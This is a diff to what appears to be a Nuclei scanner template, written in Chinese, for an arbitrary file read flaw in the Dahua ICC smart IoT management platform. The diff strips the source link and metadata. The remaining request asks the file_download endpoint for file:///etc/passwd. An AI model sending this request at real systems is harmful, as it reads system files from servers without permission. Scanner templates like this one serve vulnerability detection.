@@ -3,13 +3,8 @@ info:
   name: 大华ICC智能物联管理平台 file_download 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yo7do51katp78cau
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yo7do51katp78cau
 http:
 - raw:
   - 'GET /evo-apigw/evo-cirs/file/download?filePath=file:///etc/passwd HTTP/1.1
